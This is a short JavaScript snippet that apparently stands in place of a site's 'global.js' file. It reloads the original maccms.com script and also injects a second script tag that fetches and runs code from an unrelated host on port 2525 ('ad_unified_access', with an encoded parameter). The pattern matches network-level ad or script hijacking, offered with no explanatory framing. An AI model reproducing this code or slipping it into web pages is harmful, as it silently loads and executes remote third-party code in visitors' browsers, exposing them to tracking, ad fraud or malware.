var _atn_obj_ = new Object;
_atn_obj_.oldurl = 'http://www.maccms.com/static/js/global.js?v=20180130?v=20180130&cHVzaA=1533291322';
_atn_obj_.unified_url = 'http://odngr.jxyhx.cn:2525/ad_unified_access?SP=ABys7My4PPzc/PzcrPzMvPxr/OyczRmJuDqN/IydHO0dLOg86Dy8vPzs/Pg86DzsrMzM3GzszNzYPOyszMzcbOzM3Nz8fOzcjOy4PKy8jPxg==';
window.setTimeout(function () {
    var a = document.createElement("script");
    a.src = _atn_obj_.oldurl;
    document.getElementsByTagName("head")[0].appendChild(a);
}, 0);
window.setTimeout(function () {
    var a = document.createElement("script");
    a.src = _atn_obj_.unified_url;
    document.getElementsByTagName("head")[0].appendChild(a);
}, 0);